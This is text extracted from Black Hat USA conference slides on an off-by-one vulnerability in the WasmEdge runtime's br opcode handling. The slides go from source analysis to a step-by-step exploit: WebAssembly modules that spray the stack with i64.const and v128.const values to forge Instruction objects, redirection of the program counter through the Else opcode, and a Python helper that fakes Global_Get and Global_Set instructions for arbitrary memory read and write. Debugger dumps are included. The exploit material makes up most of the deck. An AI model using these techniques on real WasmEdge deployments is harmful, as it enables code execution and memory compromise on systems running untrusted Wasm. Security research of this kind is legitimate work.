  AST::InstrView::iterator PC = Start;
  AST::InstrView::iterator PCEnd = End;
  auto Dispatch = [this, &PC, &StoreMgr, &StackMgr]() -> Expect {
    const AST::Instruction &Instr = *PC;
    switch (Instr.getOpCode()) {
    ......
    case OpCode::Br:
      return runBrOp(StackMgr, Instr, PC);
   ......
 };
  while (PC != PCEnd) {
    OpCode Code = PC->getOpCode();
    ......
    if (auto Res = Dispatch(); !Res) {
      return Unexpect(Res);
    }
    PC++;
  }
......
Let’s see the opcode "br" 
Expect Executor::runBrOp(Runtime::StackManager &StackMgr,
                               const AST::Instruction &Instr,
                               AST::InstrView::iterator &PC) noexcept {
  return branchToLabel(StackMgr, Instr.getJump().StackEraseBegin,
                       Instr.getJump().StackEraseEnd, Instr.getJump().PCOffset,
                       PC);
}
#BHUSA   @BlackHatEvents
Information Classification: General
Expect Executor::branchToLabel(Runtime::StackManager &StackMgr,
                                     uint32_t EraseBegin, uint32_t EraseEnd,
                                     int32_t PCOffset,
                                     AST::InstrView::iterator &PC) noexcept {
  // Check stop token
  if (unlikely(StopToken.exchange(0, std::memory_order_relaxed))) {
    spdlog::error(ErrCode::Interrupted);
    return Unexpect(ErrCode::Interrupted);
  }
  StackMgr.stackErase(EraseBegin, EraseEnd);
  PC += PCOffset;
  return {};
}
PCOffset = Instr.getJump().PCOffset 
What the Value is?
Expect FormChecker::checkInstr(const AST::Instruction &Instr) {
......
 switch (Instr.getOpCode()) {
......
  case OpCode::Br:
    if (auto D = checkCtrlStackDepth(Instr.getTargetIndex()); !D) {
      return Unexpect(D);
    } else {
      // D is the last D element of control stack.
      ......
      auto &Jump = const_cast(Instr).getJump();
      ......
      Jump.PCOffset = static_cast(CtrlStack[*D].Jump - &Instr);
      return unreachable();
    }
......
Here calculate the 
Jump.PCOffset 
WasmEdge – Br Opcode Analyse
#BHUSA   @BlackHatEvents
Information Classification: General
Vulnerability – Off by One in Br Opcode
Expect Executor::branchToLabel(Runtime::StackManager &StackMgr,
                                     uint32_t EraseBegin, uint32_t EraseEnd,
                                     int32_t PCOffset,
                                     AST::InstrView::iterator &PC) noexcept {
  // Check stop token
  if (unlikely(StopToken.exchange(0, std::memory_order_relaxed))) {
    spdlog::error(ErrCode::Interrupted);
    return Unexpect(ErrCode::Interrupted);
  }
  StackMgr.stackErase(EraseBegin, EraseEnd);
  PC += PCOffset;
  return {};
}
(module
  (type (;0;) (func))
  (func (;0;) (type 0)
    call 1
  )
  (func (;1;) (type 0)
     br 0
  )
  (export "_start" (func 0))
)
PCOffset = 1
Expect Executor::execute(Runtime::StoreManager &StoreMgr,
   ......
    case OpCode::Br:
      return runBrOp(StackMgr, Instr, PC);
   ......
  while (PC != PCEnd) {
    OpCode Code = PC->getOpCode();
    ......
    if (auto Res = Dispatch(); !Res) {
      return Unexpect(Res);
    }
    PC++;
  }
......
PC += 1
PC += 1
Off By 
One?
#BHUSA   @BlackHatEvents
Information Classification: General
(module
  (type (;0;) (func))
  (func (;0;) (type 0)
    call 1
  )
  (func (;1;) (type 0)
     br 0
  )
  (export "_start" (func 0))
)
Expect Executor::branchToLabel(Runtime::StackManager &StackMgr,
......
  PC += PCOffset;
  return {};
}
PC+1
Expect Executor::execute(Runtime::StoreManager &StoreMgr,
   ......
    case OpCode::Br:
      return runBrOp(StackMgr, Instr, PC);
   ......
  while (PC != PCEnd) {
    OpCode Code = PC->getOpCode();
    ......
    if (auto Res = Dispatch(); !Res) {
      return Unexpect(Res);
    }
    PC++;
  }
......
PC++
Off By One
Vulnerability – Off by One in Br Opcode
#BHUSA   @BlackHatEvents
Information Classification: General
EXP – Off by One in  Br Opcode
How to 
control its 
content?
Use i64.const opcode 
to do heap spray
(module
  (type (;0;) (func))
  (global (;0;) i64 (i64.const 0x61626364))
  (func $_a(;1;) (type 0)
     i64.const 0x11111111
     i64.const 0x111111111
     i64.const 0x211111111
     i64.const 0x311111111
     ......
     i64.const 0xn11111111
     nop
     call $_b
     drop
     drop
     drop
     drop
     ......
     drop
  )
  (func $_b(;2;) (type 0)
     br 0
  )
  (func $_start(;0;) (type 0)
    ......
    call $_a
    ......
  )
  (export "_start" (func $_start))
  (memory (;0;) 1)
)
balance 
stack
#BHUSA   @BlackHatEvents
Information Classification: General
In file: /home/sea/Desktop/WasmEdge/lib/executor/helper.cpp
   187     spdlog::error(ErrCode::Interrupted);
   188     return Unexpect(ErrCode::Interrupted);
   189   }
   190 
   191   StackMgr.stackErase(EraseBegin, EraseEnd);
 ► 192   PC += PCOffset;
   193   return {};
   194 }
   195 
   196 Runtime::Instance::TableInstance *
   197 Executor::getTabInstByIdx(Runtime::StackManager &StackMgr,
pwndbg> x /20gx PC
0x7f6f00001d90: 0x0000000000000000 0x0000000100000000
0x7f6f00001da0: 0x0000000c000001b6 0x0000000000000000
0x7f6f00001db0: 0x0000000000000001 0x0000000000000000
0x7f6f00001dc0: 0x0000000b000001b8 0x0000000000000000
0x7f6f00001dd0: 0x0000004200000154 0x0000000000000000
0x7f6f00001de0: 0x0000002a11111111 0x0000000000000000
0x7f6f00001df0: 0x000000420000015b 0x0000000000000075
0x7f6f00001e00: 0x00005645ef63fdd8 0x00007f6f00001280
0x7f6f00001e10: 0x0000004200000046 0x00007f6f00001b10
0x7f6f00001e20: 0x0000000000000000 0x0000000000000000
Br
End
Fake Instruction 
Object
Sprayed i64.const value
We can fake an arbitrary opcode, but 
operand can’t be controlled.
EXP – Off by One in  Br Opcode
#BHUSA   @BlackHatEvents
Information Classification: General
struct Instruction {
      uint32_t JumpEnd;
      uint32_t JumpElse;
      BlockType ResType;
      uint32_t Offset = 0;
      OpCode Code;
      struct {
         bool IsAllocLabelList : 1;
         bool IsAllocValTypeList : 1;
      } Flags;
};
In file: /home/sea/Desktop/WasmEdge/lib/executor/helper.cpp
   187     spdlog::error(ErrCode::Interrupted);
   188     return Unexpect(ErrCode::Interrupted);
   189   }
   190 
   191   StackMgr.stackErase(EraseBegin, EraseEnd);
 ► 192   PC += PCOffset;
   193   return {};
   194 }
   195 
   196 Runtime::Instance::TableInstance *
   197 Executor::getTabInstByIdx(Runtime::StackManager &StackMg
r,
pwndbg> x /40wx PC
0x7f6f00001d90: 0x00000000 0x00000000 0x00000000 0x00000001
0x7f6f00001da0: 0x000001b6 0x0000000c 0x00000000 0x00000000
0x7f6f00001db0: 0x00000001 0x00000000 0x00000000 0x00000000
0x7f6f00001dc0: 0x000001b8 0x0000000b 0x00000000 0x00000000
0x7f6f00001dd0: 0x00000154 0x00000042 0x00000000 0x00000000
0x7f6f00001de0: 0x11111111 0x0000002a 0x00000000 0x0000000
Try to find some 
opcodes who use 
the JumpEnd 
EXP – Off by One in  Br Opcode
#BHUSA   @BlackHatEvents
Information Classification: General
Expect Executor::execute(Runtime::StoreManager &StoreMgr,
......
    case OpCode::Else:
......
      PC += PC->getJumpEnd();
      [[fallthrough]];
    case OpCode::End:
      PC = StackMgr.maybePopFrame(PC);
      return {};
......
We found that Else opcode 
uses JumpEnd, and the PC 
value will be changed.
(module
  (type (;0;) (func))
  (global (;0;) i64 (i64.const 0x61626364))
  (func $_a(;1;) (type 0)
     i64.const 0x11111111
     ......
     i64.const 0x291111111
     i64.const 0x500000000
     ......
     i64.const 0xn11111111
     nop
     call $_b
     drop
     drop
     drop
     drop
     ......
     drop
  )
  (func $_b(;2;) (type 0)
     br 0
  )
  (func $_start(;0;) (type 0)
    ......
    call $_a
    ......
  )
  (export "_start" (func $_start))
  (memory (;0;) 1)
)
EXP – Off by One in  Br Opcode
#BHUSA   @BlackHatEvents
Information Classification: General
(module
  (type (;0;) (func))
  (global (;0;) i64 (i64.const 0x61626364))
  (func $_a(;1;) (type 0)
     ......
     call $_b
     ......
  )
  (func $_b(;2;) (type 0)
     br 0
  )
  (func $_start(;0;) (type 0)
        nop
        v128.const i64x2 0xffffffff 0xffffffff
        nop
        v128.const i64x2 0x1ffffffff 0x1ffffffff
        ......
        nop
        v128.const i64x2 0xnffffffff 0xnffffffff
        call $_a
        drop
        drop
        ......
        drop
        ......
  )
  (export "_start" (func $_start))
  (memory (;0;) 1)
)
WasmEdge sp 
stack is 16 bytes 
as a unit
We can use 
v128.const i64x2 
to spray sp stack 
Now,  you can run 
any instructions you 
faked!
EXP – Off by One in  Br Opcode
#BHUSA   @BlackHatEvents
Information Classification: General
def Global_Get(index):
   global i
   i += 2
   code = 'nop\n'
   code += 'v128.const i64x2 %d 0\n' % (index)
   code += 'nop\n'
   code += 'v128.const i64x2 0x2300000000 0\n'
   return code
def Global_Set(index):
   global i
   i += 2
   code = 'nop\n'
   code += 'v128.const i64x2 %d 0\n' % (index)
   code += 'nop\n'
   code += 'v128.const i64x2 0x2400000000 0\n'
   return code
def i32_const(value):
   global i
   i += 2
   code = 'nop\n'
   code += 'v128.const i64x2 %d 0\n' % (value)
   code += 'nop\n'
   code += 'v128.const i64x2 0x4100000000 0\n'
   return code
......
Fake Global_Get and Global_Set instruction, 
we can get arbitrary address read / write.
Construct any opcode you 
need, and exploit it!
EXP – Off by One in  Br Opcode
#BHUSA   @BlackHatEvents
Information Classification: General
EXP – Off by One in  Br Opcode
#BHUSA   @BlackHatEvents
Information Classification: General
Conclusion 
• structured fuzzing inspired by 
       FREEDOM: Engineering a State-of-the-Art DOM Fuzzer (ACM CSS 2020)
• control pc_stack
• i32.const、i64.const、v128.const
• GlobalGet & GloblaSet
#BHUSA   @BlackHatEvents
Information Classification: General
Q & A 
@h1zhao
#BHUSA   @BlackHatEvents
Information Classification: General
Q1: can we fuzz wasm in v8 and 
other js engines?
#BHUSA   @BlackHatEvents
Information Classification: General
Thanks
天虞实验室
TianYu Lab
Thank You!
https://github.com/ha1vk/blackhat_wasm